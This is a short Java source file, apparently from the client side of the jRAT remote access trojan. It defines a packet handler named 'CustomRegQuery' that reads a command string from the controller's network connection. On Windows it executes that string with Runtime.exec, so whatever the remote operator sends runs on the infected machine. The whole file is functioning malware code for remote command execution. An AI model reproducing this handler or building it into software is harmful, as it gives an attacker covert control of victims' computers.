package jrat.client.packets.incoming;

import jrat.client.Connection;
import oslib.OperatingSystem;

public class Packet80CustomRegQuery implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String cmd = con.readLine();
		
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(cmd);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
